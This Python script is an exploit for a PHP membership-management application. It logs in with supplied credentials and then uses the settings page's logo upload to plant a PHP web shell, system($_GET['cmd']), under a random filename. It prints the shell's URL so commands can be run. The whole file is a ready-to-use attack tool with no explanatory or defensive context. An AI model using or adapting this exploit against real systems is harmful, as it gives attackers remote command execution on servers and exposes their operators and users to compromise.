import requests
import argparse
import uuid

def get_session_cookie(base_url, username, password):
    login_url = f"{base_url}index.php"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Referer': f'{base_url}index.php',
    }
    
    data = {'email': username, 'password': password, 'login': ''}
    
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    
    session = requests.Session()
    session.post(login_url, headers=headers, data=data, proxies=proxies, verify=False)
    
    return session.cookies.get('PHPSESSID')

def upload_file(base_url, phpsessid):
    upload_url = f"{base_url}settings.php"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': f'{base_url}settings.php',
    }
    
    cookies = {'PHPSESSID': phpsessid}
    
    # Generate a random filename
    random_filename = f"{uuid.uuid4()}.php"
    
    files = {
        'systemName': (None, 'Membership System'),
        'logo': (random_filename, "<?php system($_GET[\"cmd\"]);?>", 'application/x-php'),
        'currency': (None, '$'),
        'updateSettings': (None, ''),
    }
    
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    
    response = requests.post(upload_url, headers=headers, cookies=cookies, files=files, proxies=proxies, verify=False)
    
    if "success" in response.text.lower():
        print(f"File uploaded successfully. Path: {base_url}uploads/{random_filename}?cmd=id")
        return f"{base_url}uploads/{random_filename}"
    else:
        print("File upload failed")
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Login and Upload Script with Random Filename')
    parser.add_argument('-u', '--url', required=True, help='Base URL including MembershipM-PHP path')
    parser.add_argument('-l', '--login', required=True, help='Username for login')
    parser.add_argument('-p', '--password', required=True, help='Password for login')

    args = parser.parse_args()

    phpsessid = get_session_cookie(args.url, args.login, args.password)
    if phpsessid:
        upload_file(args.url, phpsessid)
    else:
        print("Failed to retrieve PHPSESSID. Cannot proceed with file upload.")
